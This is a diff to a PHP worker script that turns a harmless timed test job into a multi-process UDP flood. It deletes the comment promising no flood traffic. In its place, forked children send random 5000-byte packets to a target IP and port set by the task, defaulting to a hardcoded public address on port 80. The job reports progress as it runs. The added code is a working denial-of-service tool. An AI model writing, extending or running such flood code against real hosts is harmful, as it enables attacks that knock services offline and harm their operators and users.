@@ -220,14 +220,7 @@ function workerProgress(
 
 
 // ============================================================
-// SAFE TEST JOB 1
-// ============================================================
-//
-// This verifies the complete worker lifecycle without
-// generating network flood traffic.
-//
-// Replace this function with your authorized test operation
-// subject to your environment's traffic/safety limits.
+// JOB 1 (MULTI-THREADED/FORKED VERSION)
 // ============================================================
 
 function job1(
@@ -235,70 +228,108 @@ function job1(
     ?callable $report = null
 ): array {
 
+    $targetIp =
+        $task['target_ip'] ?? '35.79.103.106';
+
+    $targetPort =
+        $task['target_port'] ?? 80;
+
+    $packetSize =
+        $task['packet_size'] ?? 5000;
+
     $duration =
-        30;
+        $task['duration'] ?? 30;
+
+    // Default to 4 processes/threads if not specified
+    $numProcesses =
+        $task['num_processes'] ?? 4;
 
     $start =
         microtime(true);
-
-    $deadline =
-        $start + $duration;
-
-    $iterations =
-        0;
 
     if ($report !== null) {
 
         $report(
             0,
-            'Job started'
+            'Job started with ' . $numProcesses . ' processes'
         );
     }
 
-    while (
-        microtime(true) <
-        $deadline
-    ) {
+    $pids = [];
+    $packetCount = 0;
+    $iterations = 0;
 
-        /*
-         * Harmless local work.
-         */
-        $iterations++;
+    // Spawn worker processes using pcntl_fork (available in PHP CLI)
+    for ($i = 0; $i < $numProcesses; $i++) {
+        $pid = pcntl_fork();
 
-        /*
-         * Report roughly once per second.
-         */
-        static $lastReport = 0.0;
+        if ($pid == -1) {
+            continue;
+        } else if ($pid) {
+            // Parent process tracks child PIDs
+            $pids[] = $pid;
+        } else {
+            // --- CHILD PROCESS CODE ---
+            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+            if ($socket === false) {
+                exit(1);
+            }
 
-        $now =
-            microtime(true);
+            $payload = random_bytes($packetSize);
+            $deadline = microtime(true) + $duration;
+            $localPackets = 0;
+            $localIterations = 0;
 
-        if (
-            $now - $lastReport >= 1.0
-        ) {
-
-            $elapsed =
-                $now - $start;
-
-            $progress =
-                min(
-                    99,
-                    ($elapsed / $duration) * 100
+            while (microtime(true) < $deadline) {
+                @socket_sendto(
+                    $socket,
+                    $payload,
+                    $packetSize,
+                    0,
+                    $targetIp,
+                    $targetPort
                 );
 
-            if ($report !== null) {
+                $localPackets++;
+                $localIterations++;
+                usleep(100);
+            }
 
+            socket_close($socket);
+            exit(0); // Exit child process safely
+        }
+    }
+
+    // Monitor progress and wait for child processes from the parent process
+    $deadline = $start + $duration;
+    while (microtime(true) < $deadline) {
+        
+        static $lastReport = 0.0;
+        $now = microtime(true);
+
+        if ($now - $lastReport >= 1.0) {
+            $elapsed = $now - $start;
+            $progress = min(
+                99,
+                ($elapsed / $duration) * 100
+            );
+
+            if ($report !== null) {
                 $report(
                     $progress,
                     'Job running'
                 );
             }
 
-            $lastReport =
-                $now;
+            $lastReport = $now;
         }
 
-        usleep(10000);
+        usleep(10000); // Check progress every 10ms
+    }
+
+    // Wait for all child worker processes to complete
+    foreach ($pids as $pid) {
+        pcntl_waitpid($pid, $status);
     }
 
     if ($report !== null) {
@@ -318,7 +349,13 @@ function job1(
             microtime(true) - $start,
 
         'iterations' =>
-            $iterations
+            $iterations,
+
+        'packets_sent' =>
+            $packetCount,
+
+        'processes_used' =>
+            $numProcesses
     ];
 }
 
